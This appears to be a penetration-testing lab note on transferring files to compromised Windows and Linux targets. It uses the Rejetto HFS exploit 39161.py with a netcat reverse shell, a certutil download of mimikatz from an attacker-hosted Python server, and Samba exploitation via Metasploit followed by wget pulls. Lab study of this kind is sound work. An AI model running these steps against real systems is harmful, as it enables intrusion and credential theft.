Transferring files to a target system

- After obtaining initial access to a target system, you will need to transfer files to the target system
- In some cases, you will have to access to the target system via a Meterpreter session, and as a result, you will need to use the inbuilt OS specific utilities to facilitate the transfer of files from your system to the target system
- This process utilizes a two step approach, where you will need to host the files you want to transfer on a webserver and download the files hosted on the web server to the target system
- Python comes with a built in module known as SimpleHTTPServer (python2) and http.server (python3), that can be used to facilitate a Simple HTTP Server that gives you standard GET and HEAD request handlers
- This module can be used to host files in any directory of your system. And can be implemented through a single command in your terminal

python 2  : `python -m SimpleHTTPServer <port>`
python 3 : `python3 -m http.server <port>`

Transferring files to a Windows target is a lab environment the steps are as follows: 

- It is a GUI based lab so we get the target IP on desktop itself.
- On running a default service nmap scan we get it is running a File server on port 80
- Searchsploit rejettto and download the exploit Rejetto HTTP File Server (HFS) 2.3.x Remote code execution (2) - 39161.py ; searchsploit -m 39161.py
- Now in the exploit code change the host IP and port also in the EDB notes it was mentioned that we need to be hosting the nc.exe on port 80 for the successful execution of the exploit so we will be doing that specifically using the python or python3
- setup a nc listener using the command `nc -nlvp <port>` and new terminal tab to run python server
- Running exploit `python <file.py> <target-ip> port` might need to run the command multiple times to get the reverse shell
- Once we obtained the reverse shell lets say we want to download mimikatz on target system
- As it is a default hfs shell we go to the root and then the Temp directory
- In attacker machine host a simple server again with mimikatz
- Using certutil we can download the file and the command for that is `certutil -urlcache -f http://<attack-ip>:<port>/file.p -o <savefilename>`
- From here on we run the commands that we discussed in mimikatz section refer that lab environment.

Transferring files to a Linux target system:

- This a terminal based lab environment and the target IP address is adjacent to your IP address so check the IP and run the service detection scan with the NMAP
- We can see that it is running Samba service running so we will check the exploits available for the version 3.x - 4.x 
- we can use tmux as we might need multiple sessions of terminal `ctrl+b+c` to create and `ctrl+b+<no of the session>`
- using metasploit use exploit/linux/samba/is_known_pipename set the options and run the module
- We get a basic terminal and we will route to the `/bin/bash -i`
- Similar to that of the windows we need to download the files to the temp directory in the Linux target system as well incase if you are not in the temp directory navigate your session to the temp directory
- In attacker machine launch the python server either python 3 or python 2 based on the availability
- In target system we can use wget `wget http://<attacker-ip>:<port>/<file>`